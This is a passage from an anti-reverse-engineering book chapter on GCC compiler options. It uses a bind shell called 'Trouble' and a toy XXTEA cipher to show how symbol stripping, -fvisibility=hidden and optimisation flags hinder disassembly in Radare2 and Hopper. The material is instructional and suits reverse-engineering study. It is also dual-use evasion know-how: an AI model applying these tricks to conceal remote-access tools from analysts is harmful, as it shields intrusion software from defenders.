In the previous section, you removed the .symtab in order to deny a reverse engineer useful data. However, if you look at the .dynsym you’ll still find useful information. Specifically these two symbols:\n\n24: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n30: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n\n##### These are FUNC symbols that are associted with the main() and check_password() functions in Trouble. The .dynsym provides both the starting address of the function as well as its size. These are really useful pieces of information for a dissasembler!\n\n For example, looking at the check_password() function that check_password points at in Radare2 you can easily find the password.\n\n###### Radare2’s view of check_password()\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ radare2 ./trouble\n-- Execute commands on a temporary offset by appending '@ offset' to your command.\n\n[0x00400b10]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400b10]> pdf @ sym.check_password\n/ (fcn) sym.check_password 41\n| sym.check_password ();\n\n\n-----\n\n###### Chapter 2: Compiler Options 33\n\n| ; var int local_8h @ rbp-0x8\n| ; CALL XREF from 0x00400dc3 (sym.main)\n| 0x00400c06 55 push rbp\n| 0x00400c07 4889e5 mov rbp, rsp\n| 0x00400c0a 4883ec10 sub rsp, 0x10\n| 0x00400c0e 48897df8 mov qword [rbp - local_8h], rdi\n| 0x00400c12 488b45f8 mov rax, qword [rbp - local_8h]\n| 0x00400c16 ba20000000 mov edx, 0x20\n| 0x00400c1b 4889c6 mov rsi, rax\n| 0x00400c1e bf000f4000 mov edi, str.TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl\n| 0x00400c23 e848feffff call sym.imp.memcmp\n| 0x00400c28 85c0 test eax, eax\n| 0x00400c2a 0f95c0 setne al\n| 0x00400c2d c9 leave\n**\\** 0x00400c2e c3 ret\n\n[0x00400b10]>\n\n##### In case you missed it, at 0x400c1e you can see the the contents of s_password listed as str.TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl.\n\n#### Hiding FUNC symbols\n\n##### As you can see from the above, the password for the bind shell is easily retrievable. However, you can use a GCC compile flag to remove the check_password symbol and prevent a reverse engineer from, yet again, easily dumping the password. The GCC flag is “-fvisibility=hidden”¹⁸ and when you add it to Trouble’s compiler options it should look like this:\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -s -fvisibility=hidden -std=gnu11\")\n\n##### Using “-fvisibility=hidden” will, by default, hide all possible symbols. That means that check_password() would be hidden in the chapter two version of Trouble.\n\n### Static functions\n\n###### We also could have hidden the check_password symbol by using the static keyword in the function definition. In fact, if a function is not going to be used outside of the file (or translation unit) it is considered best practice to make the function static.\n\n ¹⁸https://gcc.gnu.org/onlinedocs/gcc-4.6.0/gcc/Code-Gen-Options.html\n\n\n-----\n\n###### Chapter 2: Compiler Options 34\n\n##### If you recompile Trouble after adding the visibility flag and look at .dynsym with readelf then you’ll see that both main() and check_password() are no longer present. Removing main() from Trouble’s DYNSYM has the interesting side affect that GDB no longer will be able to break at main().\n\n###### GDB waiting for main\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble...(no debugging symbols found)...done.\n(gdb) start\nFunction \"main\" not defined.\nMake breakpoint pending on future shared library load? (y or [n]) y\nTemporary breakpoint 1 (main) pending.\nStarting program: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trou\\\nble\n\n##### Also, Radare2 won’t be able to provide us easy access to check_password().\n\n\n-----\n\n###### Chapter 2: Compiler Options 35\n\n Radare2 no check_password()\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ radare2 ./trouble\n-- Now featuring NoSQL!\n\n[0x00400ad0]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400ad0]> pdf @ sym.check_password\nInvalid address (sym.check_password)\n\n[0x00400ad0]> pdf @ sym.main\nInvalid address (sym.main)\n\n##### Also, Radare2 won’t work with sym.main, but it is clever enough to find main() based on the ELF entry stub. By using the command “pdf @ main” in Radare2 you can view the main() and also find where check_password() is eventually called. Look at how the call to check_password() has changed due to the use of -fvisibility=hidden.\n\n###### Radare2: Call to check_password without -fvisibility=hidden\n\n| ||||||| ; JMP XREF from 0x00400da6 (sym.main)\n| |`------> 0x00400dbc 488d45d0 lea rax, [rbp - local_30h]\n| | ||||| 0x00400dc0 4889c7 mov rdi, rax\n| | ||||| 0x00400dc3 e83efeffff call sym.check_password\n| | ||||| 0x00400dc8 84c0 test al, al\n| |,======< 0x00400dca 7411 je 0x400ddd\n\n\n-----\n\n###### Chapter 2: Compiler Options 36\n\n Radare2: Call to check_password with -fvisibility=hidden\n\n| ||||||| ; JMP XREF from 0x00400d66 (main)\n| |`------> 0x00400d7c 488d45d0 lea rax, [rbp - local_30h]\n| | ||||| 0x00400d80 4889c7 mov rdi, rax\n| | ||||| 0x00400d83 e83efeffff call sub.memcmp_bc6\n| | ||||| 0x00400d88 84c0 test al, al\n| |,======< 0x00400d8a 7411 je 0x400d9d\n\n##### Notice in the before disassembly the binary clearly makes a call to sym.check_pass- word whereas the after disassembly makes a call to sub.memcmp_bc6 (an auto- generated function name). Contrast that to Hopper which outputs the address of check_password().\n\n###### Call to check_password() with -fvisibility=hidden as seen by Hopper\n\n0000000000400d7c lea rax, qword [ss:rbp+var_30] ; XREF=sub_400bef+375\n0000000000400d80 mov rdi, rax ; argument #1\n0000000000400d83 call sub_400bc6\n0000000000400d88 test al, al\n0000000000400d8a je 0x400d9d\n\n##### Many reverse engineers rely on these function names to provide additional context to the binary. Without the additional context the reverse engineer is left to figure it out for themselves.\n\n### -O\n\n##### An often overlooked subject is that of optimization. You control the many ways that the compiler tries to improve the performance or size of your program through the optimization flags. There are many flags¹⁹, so it’s helpful that GCC has combined many of them under various “-O” flags. While there are more “-O” flags, I believe the following four are the most useful:\n\n###### ¹⁹https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html\n\n\n-----\n\n###### Chapter 2: Compiler Options 37\n\n##### 1. -O1: “With -O, the compiler tries to reduce code size and execution time, without performing any optimizations that take a great deal of compilation time.”²⁰ 2. -O2: “Optimize even more. GCC performs nearly all supported optimizations that do not involve a space-speed tradeoff.” ²¹ 3. -O3: All optimizations in -O2 plus a handful of others. 4. -Os: “All -O2 optimizations that do not typically increase code size. It also performs further optimizations designed to reduce code size.”²²\n\n### Writing good code\n\n###### One of the problems with optimizations is that they can break poorly written programs. I think optimization levels aren’t often discussed or even fully understood by programmers because so many write such shoddy code they couldn’t use optimizations even if they wanted to.\n\n If you’re going to write code then do it well. Use -Wall and -Wextra when compiling. Use CPPCheck²³ to do static analysis. Use Valgrind²⁴ to do runtime analysis. These things are the bare minimum to write quality C or C++ code, but I’ve rarely seen security professionals use any of these tools.\n\n#### Corrected Block Tiny Encryption Algorithm (XXTEA)\n\n##### For this section, and this section only, you won’t be working with the Trouble bind shell. The usefulness of optimization as an anti-reverse engineering tool is best shown with cryptographic algorithms and it’ll be a couple of chapters until add add any real cryptography to Trouble.\n\n Therefore, I’ve implemented the Corrected Block Tiny Encryption Algorithm²⁵ (aka XXTEA) in C. My implementation is based on the reference code found on the\n\n###### ²⁰https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html ²¹https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html ²²https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html ²³http://cppcheck.sourceforge.net/ ²⁴http://valgrind.org/ ²⁵https://en.wikipedia.org/wiki/XXTEA\n\n\n-----\n\n###### Chapter 2: Compiler Options 38\n\n##### algorithm’s Wikipedia page. XXTEA will be a good example program because, as the name says, it’s quite tiny!\n\n You’ll find the source for XXTEA in the chapter two directory under the directory named “tea”. Like Trouble, “tea” uses CMake to compile. There are only two files in this project: tea.c and CMakeLists.txt.\n\n###### chap_2_compiler/tea/CMakeLists.txt\n\nproject(tea C)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/tea.c)\n\n###### chap_2_compiler/tea/src/tea.c\n\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\n/**\n\n - This is an implementation of Corrected Block Tiny Encryption Algorithm (aka\n\n - XXTEA). XXTEA is a simple block cipher designed by David Wheeler and Roger\n\n - Needham that addressed issues in the original BTEA implementation. The\n\n - algorithm was first published in 1998.\n \n - The code is based off of the reference code which you can easily find on\n\n - wikipedia: https://en.wikipedia.org/wiki/XXTEA\n \n - Note: Do not try to secure your data with this algorithm. This is just a\n\n - toy to illustrate the affects of optimization on code.\n*/\n\n#define DELTA 0x9e3779b9\n#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))\n\n**void btea_encrypt(uint32_t *v, int n, uint32_t const key[4])**\n{\n\n**uint32_t sum = 0;**\n\n\n-----\n\n###### Chapter 2: Compiler Options 39\n\n**for (unsigned rounds = 6 + 52/n; rounds > 0; --rounds)**\n{\n\n**uint32_t z = v[n-1];**\n**uint32_t y = 0;**\n**unsigned p = 0;**\n\nsum += 0x9e3779b9;\n**unsigned e = (sum >> 2) & 3;**\n\n**for ( ; (int)p < n - 1; p++)**\n{\ny = v[p+1];\nv[p] += MX;\nz = v[p];\n}\n\ny = v[0];\nv[n - 1] += MX;\nz = v[n - 1];\n}\n}\n\n**void btea_decrypt(uint32_t *v, int n, uint32_t const key[4])**\n{\n\n**unsigned rounds = 6 + 52/n;**\n**uint32_t sum = rounds * DELTA;**\n**uint32_t y = v[0];**\n**uint32_t z = 0;**\n**do**\n{\n\n**unsigned e = (sum >> 2) & 3;**\n**unsigned p = n - 1;**\n**for ( ; p > 0; p--)**\n{\nz = v[p-1];\ny = v[p] -= MX;\n}\nsum -= DELTA;\nz = v[n-1];\ny = v[0] -= MX;\n}\n**while (--rounds);**\n}\n\n\n-----\n\n###### Chapter 2: Compiler Options 40\n\n**int main()**\n{\n\n**char data[] = \"abcfefghilmno123\";**\n**uint32_t orig_len = strlen(data);**\nprintf(\"plaintext: \");\n**if ((orig_len % sizeof(uint32_t)) != 0)**\n{\nprintf(\"Bad size: %lu\\n\", (orig_len % sizeof(uint32_t)));\n**return EXIT_FAILURE;**\n}\n\n**for (size_t i = 0; i < orig_len; i++)**\n{\nprintf(\"0x%02x \", (data[i] & 0xff));\n}\nprintf(\"\\n\");\n\n**uint32_t key[4] = { 0x4a, 0x61, 0x63, 0x6b };**\n**uint32_t len = strlen(data);**\nlen = len / sizeof(uint32_t);\nprintf(\"encrypted: \");\nbtea_encrypt((uint32_t*)data, len, key);\n\n**for (size_t i = 0; i < orig_len; i++)**\n{\nprintf(\"0x%02x \", (data[i] & 0xff));\n}\nprintf(\"\\n\");\n}\n\n##### To compile tea follow the same steps that you would for Trouble.\n\n\n-----\n\n###### Chapter 2: Compiler Options 41\n\n Building tea\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_2_compiler/tea/\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ cmake ..\n-- The C compiler identification is GNU 5.4.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_2_compiler\\\n/tea/build\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ make\nScanning dependencies of target tea\n\n[ 50%] Building C object CMakeFiles/tea.dir/src/tea.c.o\n\n[100%] Linking C executable tea\n\n[100%] Built target tea\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ ./tea\nplaintext: 0x61 0x62 0x63 0x66 0x65 0x66 0x67 0x68 0x69 0x6c 0x6d 0x6e 0x6f 0x31 0x32\\\n\n0x33\nencrypted: 0xce 0x8c 0x17 0xa2 0x46 0xf6 0x52 0x54 0x0a 0xed 0xe9 0x82 0xf7 0x27 0x40\\\n\n0xfd\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$\n\n##### As you can see from the above, tea doesn’t do a whole lot. It writes out the hex version of “abcfefghilmno123” unencrypted and encrypted. However, the functionality of tea is not the focus here. I want to show you how optimization effects the function btea_encrypt().\n\n In this section, we’ll be using Hopper’s decompiler to view btea_encrypt(). There are two reasons for this:\n\n 1. A decompiler is a really nice feature that you won’t often find for free. 2. The disassembly for btea_encrypt() at the -O3 optimization level would take a few pages so its best to view it in C.\n\n\n-----\n\n###### Chapter 2: Compiler Options 42\n\n##### First, let’s get an idea of how large unoptimized btea_encrypt() is by looking at it in Radare2.\n\n###### Size of unoptimized btea_encrypt\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 ./tea\n-- Invert the block bytes using the 'I' key in visual mode\n\n[0x004007f0]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x004007f0]> pdf @ sym.btea_encrypt\n/ (fcn) sym.btea_encrypt 472\n\n##### As you can see, the size of btea_encrypt() without any optimizations is 472 bytes. This information will be useful when we look at the optimizated versions.\n\n When decompiled by Hopper the function looks like this:\n\n###### Decompiled unoptimized btea_encrypt()\n\n**int btea_encrypt(int arg0, int arg1, int arg2) {**\nvar_28 = arg0;\nvar_2C = arg1;\nvar_38 = arg2;\nvar_18 = 0x0;\nrax = 0x34 / var_2C + 0x6;\n**for (var_14 = rax; var_14 != 0x0; var_14 = var_14 - 0x1) {**\nvar_10 = *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +\n\n0xfffffffffffffffc);\nvar_C = 0x0;\nvar_18 = var_18 - 0x61c88647;\nvar_4 = var_18 >> 0x2 & 0x3;\n**while (var_2C + 0xffffffffffffffff > var_C) {**\nvar_8 = *(int32_t *)(var_28 + (var_C + 0x1) * 0x4);\n*(int32_t *)(var_C * 0x4 + var_28) = ((*(int32_t *)(var_38 +\n\n(var_C & 0x3 ^ var_4) * 0x4) ^ var_10) + (var_18 ^ var_8) ^\n(var_10 >> 0x5 ^ var_8 << 0x2) + (var_10 << 0x4 ^ var_8 >> 0x3)) +\n*(int32_t *)(var_28 + var_C * 0x4);\nvar_10 = *(int32_t *)(var_28 + var_C * 0x4);\n\n\n-----\n\n###### Chapter 2: Compiler Options 43\n\nvar_C = var_C + 0x1;\n}\nvar_8 = *(int32_t *)var_28;\n*(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +\n\n0xfffffffffffffffc) = ((*(int32_t *)(var_38 +\n(var_C & 0x3 ^ var_4) * 0x4) ^ var_10) + (var_18 ^ var_8) ^\n(var_10 >> 0x5 ^ var_8 << 0x2) + (var_10 << 0x4 ^ var_8 >> 0x3)) +\n*(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +\n\n0xfffffffffffffffc);\nrax = *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +\n\n0xfffffffffffffffc);\n}\n**return rax;**\n}\n\n##### For those not familiar with decompilers, I’m sure your response to the decompiled C is simply “whoa”. Yes, it is quite ugly. However, given that btea_encrypt relies on this macro:\n\n#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))\n\n##### The above code is fairly reasonable.\n\n#### -Os\n\n##### Now let’s play with the optimization options. Sometimes its useful to generate the smallest binary possible. -Os is useful for this because, as previously mentioned, the optimizations it does emphasize a smaller binary. To compile tea with -Os just add it to the compiler flags:\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -Os -std=gnu11\")\n\n##### After recompiling with -Os and looking at btea_encrypt() in Radare2 you’ll see that the function is much smaller now.\n\n\n-----\n\n###### Chapter 2: Compiler Options 44\n\n Size of the -Os version of btea_encrypt()\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 ./tea\n-- THIS IS NOT A BUG\n\n[0x00400910]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400910]> pdf @ sym.btea_encrypt\n/ (fcn) sym.btea_encrypt 216\n\n##### The size of btea_encrypt dropped from 472 bytes to 216! That’s pretty impressive. How does it look in Hopper’s decompiler?\n\n###### Decompiled -Os version of btea_encrypt()\n\n**int btea_encrypt(int arg0, int arg1, int arg2) {**\nrdi = arg0;\nr10 = arg2;\nstack[2047] = r13;\nstack[2046] = r12;\nstack[2045] = rbp;\nstack[2044] = rbx;\nrsp = rsp - 0x8 - 0x8 - 0x8 - 0x8;\nrsi = arg1 - 0x1;\nr11 = rdi + sign_extend_64(arg1) * 0x4 + 0xfffffffffffffffc;\nrdx = 0x0;\nrax = 0x34 / arg1 + 0x6;\n**while (rax != 0x0) {**\nrdx = rdx - 0x61c88647;\nrcx = *(int32_t *)r11;\nr8 = 0x0;\nrbp = rdx >> 0x2;\n**do {**\nr9 = r8;\n**if (rsi <= r8) {**\n\n**break;**\n}\nr9 = *(int32_t *)(rdi + r8 * 0x4 + 0x4);\nrcx = ((rcx >> 0x5 ^ r9 * 0x4) + (r9 >> 0x3 ^ rcx << 0x4) ^\n\n\n-----\n\n###### Chapter 2: Compiler Options 45\n\n(*(int32_t *)(r10 + ((rbp ^ r8) & 0x3) * 0x4) ^ rcx) +\n(rdx ^ r9)) + *(int32_t *)(rdi + r8 * 0x4);\n*(int32_t *)(rdi + r8 * 0x4) = rcx;\nr8 = r8 + 0x1;\n} while (true);\nr8 = *(int32_t *)rdi;\nrax = rax - 0x1;\n*(int32_t *)r11 = *(int32_t *)r11 + ((rcx >> 0x5 ^ r8 * 0x4) +\n\n(r8 >> 0x3 ^ rcx << 0x4) ^ (*(int32_t *)(r10 + ((rbp ^ r9) &\n0x3) * 0x4) ^ rcx) + (rdx ^ r8));\n}\n**return rax;**\n}\n\n##### I don’t think it looks too signficantly different from the unoptimized version. However, I would say that this version looks more like the original source code.\n\n Also, you have to consider that less disassembly is better for a reverse engineer. Less disassembly means fewer lines that need to be understood. This is something you should keep in mind when optimizing your code for size. Does the benefit of the smaller code outway the fact that the reverse engineer’s life is made a little easier?\n\n#### -O3\n\n##### -O3 is the second highest optimization level. The highest level, -Ofast, enables some non-standards compliant optimazations so I generally avoid it. Unlike -Os, -O3 will not shrink your binary. In fact, it has some optimizations that could make your binary much larger (for example, -finline-functions).\n\n To build with -O3 you need to change tea’s compile flags to look like this:\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -O3 -std=gnu11\")\n\n##### After building the -O3 version of tea then load it into Radare2 and check out the new size of btea_encrypt().\n\n\n-----\n\n###### Chapter 2: Compiler Options 46\n\n Finding the size of -O3 btea_encrypt() in Radare2\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 ./tea\n-- Have you setup your ~/.radare2rc today?\n\n[0x00400920]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400920]> pdf @ sym.btea_encrypt\n/ (fcn) sym.btea_encrypt 508\n\n##### The new size of btea_encrypt(), 508 bytes, is not much bigger than the original size 472 bytes. However, the decompiled code is more complicated.\n\n###### Decompiled -O3 btea_encrypt()\n\n**int btea_encrypt(int arg0, int arg1, int arg2, int arg3, int arg4) {**\nrsi = arg1;\nrdi = arg0;,\nstack[2047] = r15;\nstack[2046] = r14;\nstack[2045] = r13;\nstack[2044] = r12;\nstack[2043] = rbp;\nrbp = arg2;\nrax = 0x34 / rsi;\nrsp = rsp - 0x8 - 0x8 - 0x8 - 0x8 - 0x8 - 0x8;\nstack[2042] = rsi;\n**if (rax != 0xfffffffa) {**\nr13 = rsi + 0xffffffffffffffff;\nr14 = rsi + 0xfffffffffffffffe;\nr11 = 0x0;\n**do {**\nr11 = r11 - 0x61c88647;\nrbx = r11 >> 0x2;\nrax = *(int32_t *)stack[2042];\n**if (r13 > 0x0) {**\n\n**if (var_-4 > 0x3) {**\nrdx = *(int32_t *)rdi;\nr9 = rdi + 0x4;\n\n\n-----\n\n###### Chapter 2: Compiler Options 47\n\nr12 = 0x1;\nr8 = 0x0;\n**do {**\nrsi = *(int32_t *)r9;\nrcx = rbx ^ r8;\nr8 = r8 + 0x2;\nr9 = r9 + 0x8;\nrcx = ((rax >> 0x5 ^ rsi * 0x4) + (rsi >> 0x3 ^ rax << 0x4) ^\n\n(r11 ^ rsi) + (*(int32_t *)(rbp + (rcx & 0x3) * 0x4) ^\nrax)) + rdx;\nrdx = *(int32_t *)(r9 + 0xfffffffffffffffc);\nrax = rbx ^ r12;\nr12 = r12 + 0x2;\n*(int32_t *)(r9 + 0xfffffffffffffff4) = rcx;\nrax = ((rcx << 0x4 ^ rdx >> 0x3) + (rcx >> 0x5 ^ rdx * 0x4) ^\n\n(*(int32_t *)(rbp + (rax & 0x3) * 0x4) ^ rcx) + (r11 ^\nrdx)) + rsi;\n*(int32_t *)(r9 + 0xfffffffffffffff8) = rax;\n} while (r12 < r14);\n}\n**else {**\nr8 = 0x0;\n}\n**do {**\nrsi = rdi + r8 * 0x4;\nrcx = r8 + 0x1;\nr9 = *(int32_t *)(rbp + ((r8 ^ rbx) & 0x3) * 0x4);\nrdx = *(int32_t *)(rdi + (r8 + 0x1) * 0x4);\nr8 = rcx;\nrax = ((rax << 0x4 ^ rdx >> 0x3) + (rax >> 0x5 ^ rdx * 0x4) ^\n\n(r9 ^ rax) + (r11 ^ rdx)) + *(int32_t *)rsi;\n*(int32_t *)rsi = rax;\n} while (rcx < r13);\nrcx = r13;\nrsi = *(int32_t *)stack[2042];\n}\n**else {**\nrsi = rax;\nrcx = 0x0;\n}\nrdx = *(int32_t *)rdi;\nrax = ((*(int32_t *)(rbp + ((rbx ^ rcx) & 0x3) * 0x4) ^ rax) + (r11 ^\n\nrdx) ^ (rdx >> 0x3 ^ rax << 0x4) + (rax >> 0x5 ^ rdx * 0x4)) + rsi;\n\n\n-----\n\n###### Chapter 2: Compiler Options 48\n\n*(int32_t *)stack[2042] = rax;\n} while (r11 != var_-8);\n}\n**return rax;**\n}\n\n##### There really isn’t much more to say. Higher optimization levels can generate more complicated code.\n\n#### -funroll-loops\n\n##### If the goal is to produce increasingly long and complicated code then -funroll-loops is useful. -funroll-loops will “unroll” or undo the looping structure of any loop whose iterations can be determined at compile time.\n\n Building on the previous section, you should add -funroll-loops right after -O3.\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -O3 -funroll-loops -std=gnu11\")\n\n##### Now if you recompile and look at the size of btea_encrypt() in Radare2 you’ll see that the function has ballooned to 800 bytes!\n\n###### Size of -O3 -funroll-loops btea_encrypt()\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 ./tea\n-- Learn pancake as if you were radare!\n\n[0x00400ad0]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400ad0]> pdf @ sym.btea_encrypt\n/ (fcn) sym.btea_encrypt 800\n\n##### The decompiled code is signficantly more complicated than the original.\n\n\n-----\n\n###### Chapter 2: Compiler Options 49\n\n Decompiled -O3 -funroll-loops btea_encrypt()\n\n**int btea_encrypt(int arg0, int arg1, int arg2) {**\nrsi = arg1;\nrdi = arg0;\nstack[2047] = r15;\nstack[2046] = r14;\nstack[2045] = r13;\nstack[2044] = r12;\nstack[2043] = rbp;\nrbp = arg2;\nrax = 0x34 / rsi;\nstack[2042] = rbx;\nrsp = rsp - 0x8 - 0x8 - 0x8 - 0x8 - 0x8 - 0x8;\n**if (rax != 0xfffffffa) {**\nr12 = rsi + 0xffffffffffffffff;\nr11 = 0x0;\nstack[2042] = rsi + 0xfffffffffffffffe;\n**do {**\nr11 = r11 - 0x61c88647;\nrsi = r11 >> 0x2;\nrax = *(int32_t *)stack[2042];\n**if (r12 > 0x0) {**\n\n**if (var_-8 > 0x3) {**\nrdx = *(int32_t *)rdi;\nrbx = stack[2042];\nr10 = rdi + 0x4;\nr13 = 0x1;\nrcx = 0x0;\n**do {**\nr9 = *(int32_t *)r10;\nr14 = rsi ^ rcx;\nr10 = r10 + 0x8;\nrcx = rcx + 0x2;\nr8 = (r11 ^ r9) + (*(int32_t *)(rbp + (r14 & 0x3) * 0x4) ^\n\nrax);\nr15 = rsi ^ r13;\nr13 = r13 + 0x2;\nr8 = ((rax >> 0x5 ^ r9 * 0x4) + (r9 >> 0x3 ^ rax << 0x4) ^\n\nr8) + rdx;\nrdx = *(int32_t *)(r10 + 0xfffffffffffffffc);\n*(int32_t *)(r10 + 0xfffffffffffffff4) = r8;\nrax = ((r8 << 0x4 ^ rdx >> 0x3) + (r8 >> 0x5 ^ rdx * 0x4) ^\n\n\n-----\n\n###### Chapter 2: Compiler Options 50\n\n(*(int32_t *)(rbp + (r15 & 0x3) * 0x4) ^ r8) +\n(r11 ^ rdx)) + r9;\n*(int32_t *)(r10 + 0xfffffffffffffff8) = rax;\n} while (r13 < rbx);\n}\n**else {**\nrcx = 0x0;\n}\nr14 = rcx + 0x1;\nr8 = *(int32_t *)(rdi + r14 * 0x4);\nrdx = r14;\nr9 = !rcx + r12 & 0x1;\nrax = ((r8 >> 0x3 ^ rax << 0x4) + (r8 << 0x2 ^ rax >> 0x5) ^\n\n(r11 ^ r8) + (*(int32_t *)(rbp + ((rsi ^ rcx) & 0x3) * 0x4)\n^ rax)) + *(int32_t *)(rdi + rcx * 0x4);\n*(int32_t *)(rdi + rcx * 0x4) = rax;\n**if (r14 < r12) {**\n\n**if (r9 != 0x0) {**\nr8 = *(int32_t *)(rdi + (rcx + 0x2) * 0x4);\nrdx = (r11 ^ r8) + (*(int32_t *)(rbp + ((rdx ^ rsi) &\n\n0x3) * 0x4) ^ rax) ^ (rax >> 0x5 ^ r8 << 0x2) +\n(r8 >> 0x3 ^ rax << 0x4);\nrax = *(int32_t *)(rdi + r14 * 0x4);\nrax = rax + rdx;\nrdx = rcx + 0x2;\n*(int32_t *)(rdi + r14 * 0x4) = rax;\n**if (rcx + 0x2 < r12) {**\n\n**do {**\nr10 = rdi + rdx * 0x4;\nrbx = *(int32_t *)(rdi + (rdx + 0x1) * 0x4);\nr9 = rdi + (rdx + 0x1) * 0x4;\nr8 = (rdx + 0x1 ^ rsi) & 0x3;\nr15 = ((r11 ^ rbx) + (*(int32_t *)(rbp + ((rsi ^\n\nrdx) & 0x3) * 0x4) ^ rax) ^ (rax >> 0x5 ^ rbx\n<< 0x2) + (rbx >> 0x3 ^ rax << 0x4)) +\n*(int32_t *)r10;\nrax = rdx + 0x2;\nrdx = rdx + 0x2;\n*(int32_t *)r10 = r15;\nr10 = *(int32_t *)(rdi + rax * 0x4);\nrax = ((r11 ^ r10) + (*(int32_t *)(rbp + r8 * 0x4)\n\n^ r15) ^ (r15 >> 0x5 ^ r10 << 0x2) + (r10 >> 0x3\n^ r15 << 0x4)) + *(int32_t *)r9;\n\n\n-----\n\n###### Chapter 2: Compiler Options 51\n\n*(int32_t *)r9 = rax;\n} while (rdx < r12);\n}\n}\n**else {**\n\n**do {**\nr10 = rdi + rdx * 0x4;\nrbx = *(int32_t *)(rdi + (rdx + 0x1) * 0x4);\nr9 = rdi + (rdx + 0x1) * 0x4;\nr8 = (rdx + 0x1 ^ rsi) & 0x3;\nr15 = ((r11 ^ rbx) + (*(int32_t *)(rbp + ((rsi ^ rdx) &\n\n0x3) * 0x4) ^ rax) ^ (rax >> 0x5 ^ rbx << 0x2) +\n(rbx >> 0x3 ^ rax << 0x4)) + *(int32_t *)r10;\nrax = rdx + 0x2;\nrdx = rdx + 0x2;\n*(int32_t *)r10 = r15;\nr10 = *(int32_t *)(rdi + rax * 0x4);\nrax 